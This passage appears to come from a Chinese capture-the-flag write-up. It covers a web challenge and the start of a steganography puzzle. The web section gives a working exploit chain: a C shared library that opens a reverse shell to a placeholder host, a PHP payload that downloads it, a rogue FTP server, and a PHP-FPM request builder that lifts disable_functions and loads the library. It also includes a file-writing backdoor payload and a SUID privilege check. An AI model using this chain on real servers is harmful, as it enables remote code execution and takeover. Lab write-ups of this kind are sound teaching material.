+<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># pass PHP scripts to FastCGI server</span><br><span class="line">	#</span><br><span class="line">	location ~ \.php$ &#123;</span><br><span class="line">    root           html;</span><br><span class="line">    fastcgi_pass   127.0.0.1:9001;</span><br><span class="line">    fastcgi_index  index.php;</span><br><span class="line">    fastcgi_param  SCRIPT_FILENAME  &#x2F;var&#x2F;www&#x2F;html&#x2F;$fastcgi_script_name;</span><br><span class="line">    include        fastcgi_params;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>使用如下代码编译出反弹 shell 的恶意 so 文件。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) <span class="function"><span class="keyword">void</span> <span class="title">preload</span> <span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    system(<span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/YOUR_HOST/3255 0&gt;&amp;1&#x27;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc hpdoger.c -fPIC -shared -o hpdoger.so</span><br></pre></td></tr></table></figure>
+
+<p>拼接使用如下的载荷将编译好的文件上传到靶机。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy(<span class="string">&#x27;http://YOUR_HOST/hpdoger.so&#x27;</span>, <span class="string">&#x27;/tmp/hpdoger.so&#x27;</span>);print_r(scandir(<span class="string">&#x27;/tmp&#x27;</span>));</span><br></pre></td></tr></table></figure>
+
+<p>成功时可以得到如下回显。</p>
+<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Array ( [0] &#x3D;&gt; . [1] &#x3D;&gt; .. [2] &#x3D;&gt; hpdoger.so )</span><br></pre></td></tr></table></figure>
+
+<p>写一个恶意的 FTP 客户端。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket <span class="keyword">as</span> Socket</span><br><span class="line">socket = Socket.socket(Socket.AF_INET, Socket.SOCK_STREAM)</span><br><span class="line">socket.bind((<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">23</span>))  <span class="comment"># Bind socket to FTP port</span></span><br><span class="line">socket.listen(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">connection, address = socket.accept()</span><br><span class="line">connection.send(<span class="string">b&#x27;220 Welcome to py.evil.lemonprefect.cn\n&#x27;</span>)</span><br><span class="line">connection.send(<span class="string">b&#x27;331 Give me your password\n&#x27;</span>)</span><br><span class="line">connection.send(<span class="string">b&#x27;230 Fake Login Successful\n&#x27;</span>)</span><br><span class="line">connection.send(<span class="string">b&#x27;200 Switch to Binary mode KORA\n&#x27;</span>)</span><br><span class="line">connection.send(<span class="string">b&#x27;550 File Size?\n&#x27;</span>)</span><br><span class="line">connection.send(<span class="string">b&#x27;150 Fine\n&#x27;</span>)</span><br><span class="line">connection.send(<span class="string">b&#x27;227 Now Enter Extended Passive Mode (127,0,0,1,0,9001) Aha\n&#x27;</span>)</span><br><span class="line">connection.send(<span class="string">b&#x27;150 Actually No File\n&#x27;</span>)</span><br><span class="line">connection.send(<span class="string">b&#x27;221 Give me five and a reflect shell\n&#x27;</span>)</span><br><span class="line">connection.close()</span><br></pre></td></tr></table></figure>
+
+<p>修改参考中的代码生成 payload。</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/wofeiwo/webcgi-exploits/blob/master/php/Fastcgi/fcgi_jailbreak.php#L29">https://github.com/wofeiwo/webcgi-exploits/blob/master/php/Fastcgi/fcgi_jailbreak.php#L29</a></p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FCGIClient</span></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> VERSION_1 = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">const</span> BEGIN_REQUEST = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">const</span> PARAMS = <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">const</span> STDIN = <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">const</span> RESPONDER = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_host</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_port</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_keepAlive</span> = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$host</span>, <span class="variable">$port</span> = <span class="number">9000</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_host = <span class="variable">$host</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_port = <span class="variable">$port</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">request</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$params</span>, <span class="variable">$stdin</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$request</span> = <span class="keyword">$this</span>-&gt;buildPacket(<span class="built_in">self</span>::BEGIN_REQUEST, chr(<span class="number">0</span>) . chr(<span class="built_in">self</span>::RESPONDER) . chr((<span class="keyword">int</span>)<span class="keyword">$this</span>-&gt;_keepAlive) . str_repeat(chr(<span class="number">0</span>), <span class="number">5</span>));</span><br><span class="line">        <span class="variable">$paramsRequest</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$params</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) <span class="variable">$paramsRequest</span> .= <span class="keyword">$this</span>-&gt;buildNvpair(<span class="variable">$key</span>, <span class="variable">$value</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$paramsRequest</span>) <span class="variable">$request</span> .= <span class="keyword">$this</span>-&gt;buildPacket(<span class="built_in">self</span>::PARAMS, <span class="variable">$paramsRequest</span>);</span><br><span class="line">        <span class="variable">$request</span> .= <span class="keyword">$this</span>-&gt;buildPacket(<span class="built_in">self</span>::PARAMS, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$stdin</span>) <span class="variable">$request</span> .= <span class="keyword">$this</span>-&gt;buildPacket(<span class="built_in">self</span>::STDIN, <span class="variable">$stdin</span>);</span><br><span class="line">        <span class="variable">$request</span> .= <span class="keyword">$this</span>-&gt;buildPacket(<span class="built_in">self</span>::STDIN, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&#x27;data=&#x27;</span> . urlencode(<span class="variable">$request</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">buildPacket</span>(<span class="params"><span class="variable">$type</span>, <span class="variable">$content</span>, <span class="variable">$requestId</span> = <span class="number">1</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$clen</span> = strlen(<span class="variable">$content</span>);</span><br><span class="line">        <span class="keyword">return</span> chr(<span class="built_in">self</span>::VERSION_1)</span><br><span class="line">            . chr(<span class="variable">$type</span>)</span><br><span class="line">            . chr((<span class="variable">$requestId</span> &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>)</span><br><span class="line">            . chr(<span class="variable">$requestId</span> &amp; <span class="number">0xFF</span>)</span><br><span class="line">            . chr((<span class="variable">$clen</span> &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>)</span><br><span class="line">            . chr(<span class="variable">$clen</span> &amp; <span class="number">0xFF</span>)</span><br><span class="line">            . chr(<span class="number">0</span>)</span><br><span class="line">            . chr(<span class="number">0</span>)</span><br><span class="line">            . <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">buildNvpair</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$nlen</span> = strlen(<span class="variable">$name</span>);</span><br><span class="line">        <span class="variable">$vlen</span> = strlen(<span class="variable">$value</span>);</span><br><span class="line">        <span class="variable">$nvpair</span> = <span class="variable">$nlen</span> &lt; <span class="number">128</span> ? chr(<span class="variable">$nlen</span>) : chr((<span class="variable">$nlen</span> &gt;&gt; <span class="number">24</span>) | <span class="number">0x80</span>) . chr((<span class="variable">$nlen</span> &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) . chr((<span class="variable">$nlen</span> &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) . chr(<span class="variable">$nlen</span> &amp; <span class="number">0xFF</span>);</span><br><span class="line">        <span class="variable">$nvpair</span> = <span class="variable">$vlen</span> &lt; <span class="number">128</span> ? <span class="variable">$nvpair</span> . chr(<span class="variable">$vlen</span>) : <span class="variable">$nvpair</span> . chr((<span class="variable">$vlen</span> &gt;&gt; <span class="number">24</span>) | <span class="number">0x80</span>) . chr((<span class="variable">$vlen</span> &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) . chr((<span class="variable">$vlen</span> &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) . chr(<span class="variable">$vlen</span> &amp; <span class="number">0xFF</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$nvpair</span> . <span class="variable">$name</span> . <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$filepath</span> = <span class="string">&quot;/var/www/html/add_api.php&quot;</span>;  <span class="comment">// PHP file path</span></span><br><span class="line"><span class="variable">$req</span> = <span class="string">&#x27;/&#x27;</span> . basename(<span class="variable">$filepath</span>);</span><br><span class="line"><span class="variable">$uri</span> = <span class="variable">$req</span> . <span class="string">&#x27;?&#x27;</span> . <span class="string">&#x27;command=whoami&#x27;</span>;</span><br><span class="line"><span class="variable">$client</span> = <span class="keyword">new</span> FCGIClient(<span class="string">&quot;unix:///var/run/php-fpm.sock&quot;</span>, -<span class="number">1</span>);</span><br><span class="line"><span class="variable">$code</span> = <span class="string">&quot;&lt;?php system(\$_REQUEST[&#x27;command&#x27;]); phpinfo(); ?&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$php_value</span> = <span class="string">&quot;unserialize_callback_func = system\nextension_dir = /tmp\nextension = hpdoger.so\ndisable_classes = \ndisable_functions = \nallow_url_include = On\nopen_basedir = /\nauto_prepend_file = &quot;</span>;  <span class="comment">// import evil hpdoger.so from /tmp</span></span><br><span class="line"><span class="variable">$params</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;GATEWAY_INTERFACE&#x27;</span> =&gt; <span class="string">&#x27;FastCGI/1.0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;REQUEST_METHOD&#x27;</span> =&gt; <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SCRIPT_FILENAME&#x27;</span> =&gt; <span class="variable">$filepath</span>,</span><br><span class="line">    <span class="string">&#x27;SCRIPT_NAME&#x27;</span> =&gt; <span class="variable">$req</span>,</span><br><span class="line">    <span class="string">&#x27;QUERY_STRING&#x27;</span> =&gt; <span class="string">&#x27;command=whoami&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;REQUEST_URI&#x27;</span> =&gt; <span class="variable">$uri</span>,</span><br><span class="line">    <span class="string">&#x27;DOCUMENT_URI&#x27;</span> =&gt; <span class="variable">$req</span>,</span><br><span class="line">    <span class="string">&#x27;PHP_VALUE&#x27;</span> =&gt; <span class="variable">$php_value</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_SOFTWARE&#x27;</span> =&gt; <span class="string">&#x27;80sec/wofeiwo&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;REMOTE_ADDR&#x27;</span> =&gt; <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;REMOTE_PORT&#x27;</span> =&gt; <span class="string">&#x27;9001&#x27;</span>,  <span class="comment">// Fast_CGI Port</span></span><br><span class="line">    <span class="string">&#x27;SERVER_ADDR&#x27;</span> =&gt; <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_PORT&#x27;</span> =&gt; <span class="string">&#x27;80&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_NAME&#x27;</span> =&gt; <span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_PROTOCOL&#x27;</span> =&gt; <span class="string">&#x27;HTTP/1.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;CONTENT_LENGTH&#x27;</span> =&gt; strlen(<span class="variable">$code</span>)</span><br><span class="line">);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$client</span>-&gt;request(<span class="variable">$params</span>, <span class="variable">$code</span>) . <span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>运行脚本可以得到如下结果。</p>
+<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data&#x3D;%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%02%3F%00%00%11%0BGATEWAY_INTERFACEFastCGI%2F1.0%0E%04REQUEST_METHODPOST%0F%19SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Fadd_api.php%0B%0CSCRIPT_NAME%2Fadd_api.php%0C%0EQUERY_STRINGcommand%3Dwhoami%0B%1BREQUEST_URI%2Fadd_api.php%3Fcommand%3Dwhoami%0C%0CDOCUMENT_URI%2Fadd_api.php%09%80%00%00%B3PHP_VALUEunserialize_callback_func+%3D+system%0Aextension_dir+%3D+%2Ftmp%0Aextension+%3D+hpdoger.so%0Adisable_classes+%3D+%0Adisable_functions+%3D+%0Aallow_url_include+%3D+On%0Aopen_basedir+%3D+%2F%0Aauto_prepend_file+%3D+%0F%0DSERVER_SOFTWARE80sec%2Fwofeiwo%0B%09REMOTE_ADDR127.0.0.1%0B%04REMOTE_PORT9001%0B%09SERVER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOCOLHTTP%2F1.1%0E%02CONTENT_LENGTH49%01%04%00%01%00%00%00%00%01%05%00%01%001%00%00%3C%3Fphp+system%28%24_REQUEST%5B%27command%27%5D%29%3B+phpinfo%28%29%3B+%3F%3E%01%05%00%01%00%00%00%00</span><br></pre></td></tr></table></figure>
+
+<p>构造出如下载荷。</p>
+<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?backdoor&#x3D;$file&#x3D;$_GET[&#39;file&#39;];$data&#x3D;$_GET[&#39;data&#39;];file_put_contents($file, $data);</span><br><span class="line">&amp;file&#x3D;ftp:&#x2F;&#x2F;evil@YOUR_HOST&#x2F;evil&amp;data&#x3D;GENERATED_DATA_HERE</span><br></pre></td></tr></table></figure>
+
+<p>运行写好的恶意 FTP 服务端，监听在恶意 so 中设定的端口。将载荷拼接后发送后可以在监听端口处得到反弹的 shell。</p>
+<p>使用 <code>find /usr/local/bin -perm -u=s -type f 2&gt;/dev/null</code> 查到 PHP 具有 suid，因此直接使用 PHP 的交互 shell 尝试获取 flag。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">www-data@1f3072aea021:~/html$ find /usr/<span class="built_in">local</span>/bin -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">&lt; find /usr/<span class="built_in">local</span>/bin -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">/usr/<span class="built_in">local</span>/bin/php</span><br></pre></td></tr></table></figure>
+
+<p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://butter.lumosary.workers.dev/images/archive/7f363bdc-676b-4e98-b8ef-59cfda4fd170/1620049443407.2dd7c47cdc393ff1db87508c1ea764be60013542.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;d0a13137-6a17-408a-8298-16b816f34806&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="冬奥会-is-coming"><a href="#冬奥会-is-coming" class="headerlink" title="冬奥会_is_coming"></a>冬奥会_is_coming</h3><p>附件给出了一张图片，使用 <code>binwalk -e</code> 可以分离出一个压缩文档。压缩包的备注中有 <code>eight numbers</code> 的提示，但是压缩包本身并没有被加密，因此猜测是有隐写。使用 010 editor 打开解压所得的音频文件可在其尾部发现如下信息。</p>
+<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">🙃💵🌿🎤🚪🌏🐎🥋🚫😆🎃✅⌨🔪❓🚫🐍🙃🔬✉👁😆🎈🐘🏎🐘🐘😂😎🎅🖐🐍✉🍌🌪🐎🍵✅🚪✖☃👣👉ℹ🔪🍎🔄👣🚪😁👣💵🐅🍵🔬🛩😇🖐🖐🎅✅🏎👌🚨😆🎤🎅🦓🌿🦓🙃✖🍌🛩😂👑🌏☃😇😍🛩🚹😀🍌🎈💧🗒🗒</span><br></pre></td></tr></table></figure>
+
+<p>猜测是 emoji-aes 加密，但是使用冬奥会的日期作为 key 尝试解密并不成功，因此猜测在音频中仍然有信息。使用 MP3stego 配合冬奥会日期 <code>20220204</code> 作为 key 执行 <code>Decode.exe -X -P 20220204 .\encode.mp3</code> 可提取出如下信息。</p>
+<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\xe2\x9c\x8c\xef\xb8\x8e \xe2\x98\x9d\xef\xb8\x8e\xe2\x99\x93\xef\xb8\x8e\xe2\xa7\xab\xef\xb8\x8e\xe2\x98\x9f\xef\xb8\x8e\xe2\x97\x86\xef\xb8\x8e\xe2\x99\x8c\xef\xb8\x8e \xe2\x9d\x92\xef\xb8\x8e\xe2\x99\x8f\xef\xb8\x8e\xe2\x97\xbb\xef\xb8\x8e\xe2\x96\xa1\xef\xb8\x8e\xe2\xac\xa7\xef\xb8\x8e\xe2\x99\x93\xef\xb8\x8e\xe2\xa7\xab\xef\xb8\x8e\xe2\x96\xa1\xef\xb8\x8e\xe2\x9d\x92\xef\xb8\x8e\xe2\x8d\x93\xef\xb8\x8e \xe2\x96\xa0\xef\xb8\x8e\xe2\x99\x8b\xef\xb8\x8e\xe2\x9d\x8d\xef\xb8\x8e\xe2\x99\x8f\xef\xb8\x8e\xe2\x99\x8e\xef\xb8\x8e \xf0\x9f\x93\x82\xef\xb8\x8e\xe2\x99\x8d\xef\xb8\x8e\xe2\x99\x8f\xef\xb8\x8e\xf0\x9f\x8f\xb1\xef\xb8\x8e\xe2\x99\x8f\xef\xb8\x8e\xe2\x99\x8b\xef\xb8\x8e\xf0\x9f\x99\xb5 \xe2\x99\x93\xef\xb8\x8e\xe2\xac\xa7\xef\xb8\x8e \xe2\x9d\x96\xef\xb8\x8e\xe2\x99\x8f\xef\xb8\x8e\xe2\x9d\x92\xef\xb8\x8e\xe2\x8d\x93\xef\xb8\x8e \xe2\x99\x93\xef\xb8\x8e\xe2\x96\xa0\xef\xb8\x8e\xe2\xa7\xab\xef\xb8\x8e\xe2\x99\x8f\xef\xb8\x8e\xe2\x9d\x92\xef\xb8\x8e\xe2\x99\x8f\xef\xb8\x8e\xe2\xac\xa7\xef\xb8\x8e\xe2\xa7\xab\xef\xb8\x8e\xe2\x99\x93\xef\xb8\x8e\xe2\x96\xa0\xef\xb8\x8e\xe2\x99\x91\xef\xb8\x8e\xf0\x9f\x93\xac\xef\xb8\x8e \xf0\x9f\x95\x88\xef\xb8\x8e\xe2\x99\x92\xef\xb8\x8e\xe2\x8d\x93\xef\xb8\x8e \xe2\x96\xa0\xef\xb8\x8e\xe2\x96\xa1\xef\xb8\x8e\xe2\xa7\xab\xef\xb8\x8e \xe2\xa7\xab\xef\xb8\x8e\xe2\x99\x8b\xef\xb8\x8e\xf0\x9f\x99\xb5\xe2\x99\x8f\xef\xb8\x8e \xe2\x99\x8b\xef\xb8\x8e \xe2\x97\x8f\xef\xb8\x8e\xe2\x96\xa1\xef\xb8\x8e\xe2\x96\xa1\xef\xb8\x8e\xf0\x9f\x99\xb5 \xe2\x99\x8b\xef\xb8\x8e\xe2\xa7\xab\xef\xb8\x8e \xe2\x99\x93\xef\xb8\x8e\xe2\xa7\xab\xef\xb8\x8e\xe2\x9c\x8d\xef\xb8\x8e</span><br></pre></td></tr></table></figure>
+
+<p>使用 CyberChef From Hex 解码后可得如下内容。</p>
+<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">✌︎☝︎♓︎⧫︎☟︎◆︎♌︎❒︎♏︎◻︎□︎⬧︎♓︎⧫︎□︎❒︎⍓︎■︎♋︎❍︎♏︎♎︎📂︎♍︎♏︎🏱︎♏︎♋︎🙵♓︎⬧︎❖︎♏︎❒︎⍓︎♓︎■︎⧫︎♏︎❒︎♏︎⬧︎⧫︎♓︎■︎♑︎📬︎🕈︎♒︎⍓︎■︎□︎⧫︎⧫︎♋︎🙵♏︎♋︎●︎□︎□︎🙵♋︎⧫︎♓︎⧫︎✍︎</span><br></pre></td></tr></table></figure>
+
+<p>用 <a target="_blank" rel="noopener" href="https://wingdingstranslator.com/">Wingdings Translator</a> 将其翻译后可得如下内容。</p>
